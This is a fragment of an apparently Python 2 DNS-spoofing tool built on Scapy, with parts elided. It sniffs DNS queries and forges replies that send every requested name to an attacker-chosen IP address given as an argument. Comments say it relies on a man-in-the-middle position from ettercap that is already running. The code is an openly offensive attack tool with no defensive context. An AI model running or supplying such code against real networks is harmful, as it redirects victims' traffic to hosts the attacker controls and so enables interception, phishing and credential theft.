...
# <- This command allows a computer (running ettercap) to create a MiTM to
# sniff and inject (DNS spoof) traffic
  ...
  while True:
    ...
    if DNSQR in pkts[0]:
      ...
      resp = IP(proto = 'udp', src = pkts[0][IP].dst, dst = pkts[0][IP].src,
             ...
             DNS(id = pkts[0][DNS].id, qr = 1L, opcode ='QUERY', aa = 1L,
                      rd = 1L, ancount = 1, qd = pkts[0][DNS].qd,
                      an=DNSRR(rrname=pkts[0][DNS].qd.qname, ttl = 80,
                      rdata = sys.argv[1]))
      print '#'*50
      print '-[Req Detected]'
      print pkts[0].show()
...
This program will spoof DNS requests (all of them) modifying the response to
have the IP_Address as destination. This program requires a MiTM already
running"""
